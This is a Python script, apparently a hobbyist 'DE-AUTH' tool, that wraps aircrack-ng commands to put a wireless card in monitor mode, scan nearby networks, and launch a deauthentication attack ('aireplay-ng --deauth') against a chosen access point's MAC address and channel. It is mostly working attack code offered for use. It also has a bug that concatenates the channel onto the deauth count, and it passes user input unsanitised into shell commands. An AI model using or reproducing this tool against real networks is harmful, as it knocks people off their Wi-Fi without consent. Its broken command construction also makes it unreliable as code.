import subprocess
from colorama import Fore, Style
from colorama import init
from time import sleep




def main():
    subprocess.call("clear", shell=True)
    print(Fore.YELLOW + """
    ██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗
    ██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║
    ██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║
    ██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║
    ██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║
    ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                                          Coded by Unqown
       """ + Style.NORMAL + Fore.RED)
    print(Style.BRIGHT + Fore.LIGHTCYAN_EX+ "")
    print(" [1] Start Wlan0")
    print(" [2] Stop Wlan0")
    print(" [3] Look the avaible network")
    print(" [4] Look the network inside")
    print(" [5] Attack")
    print(" [6] Search only 1 channel")
    print(" [7] Exit Script")
    print(Fore.LIGHTMAGENTA_EX + "")
    menu = int(input(" > "  + Fore.WHITE))


    if menu == 1:
        print(Fore.LIGHTBLUE_EX + "")
        subprocess.call("sudo airmon-ng start wlan0", shell=True)
        main()
    elif menu == 2:
        print(Fore.LIGHTBLUE_EX + "")
        subprocess.call("sudo airmon-ng stop wlan0mon", shell=True)
        main()
    elif menu == 3:
        print(Fore.LIGHTBLUE_EX + "")
        subprocess.call("sudo airodump-ng wlan0mon", shell=True)
        sleep(6)
        main()
    elif menu == 4:
        mac = input(Fore.LIGHTBLUE_EX + "MAC Adresi > " + Fore.WHITE)
        channel = input(Fore.LIGHTBLUE_EX + "Kanal > " + Fore.WHITE)
        subprocess.call("sudo airodump-ng --channel " + str(channel) + " --bssid "+ mac + " wlan0mon", shell=True)
        main()
    elif menu == 5:
        mac = input(Fore.LIGHTBLUE_EX + "MAC Adresi > " + Fore.WHITE)
        channel = input(Fore.LIGHTBLUE_EX + "Kanal > " + Fore.WHITE)
        subprocess.call("sudo airodump-ng --channel " + str(channel) + " --bssid "+ mac + " wlan0mon", shell=True)
        subprocess.call("sudo aireplay-ng --deauth 30" + str(channel) + " -a "+ mac + " wlan0mon", shell=True)
        main()
    elif menu == 6:
        channel = input(Fore.LIGHTBLUE_EX + "Kanal > " + Fore.WHITE)
        subprocess.call("sudo airodump-ng wlan0mon --channel "+ str(channel), shell=True)
        main()
        

    elif menu == 7:
        subprocess.call("clear", shell=True)
        print(Fore.LIGHTBLUE_EX + "Quited")
        quit()
    else:
        print(Fore.RED + " ID Not defined")
        sleep(0.6)
        main()
if __name__ == "__main__":
    main()